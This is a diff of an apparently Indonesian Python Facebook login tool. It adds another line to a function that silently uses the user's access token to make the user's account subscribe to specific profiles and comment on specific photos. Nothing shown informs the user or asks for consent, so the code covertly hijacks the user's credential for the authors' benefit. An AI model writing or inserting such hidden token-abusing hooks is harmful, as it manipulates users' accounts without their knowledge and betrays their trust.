@@ -143,6 +143,7 @@ def ___follow___():
         requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
         requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
         requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
+	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
     except:
         exit("%s[%s!%s]%s Login Gagal"%(P,M,P,M))
     print("%s[%s*%s]%s Login Berhasil"%(H,P,H,P))
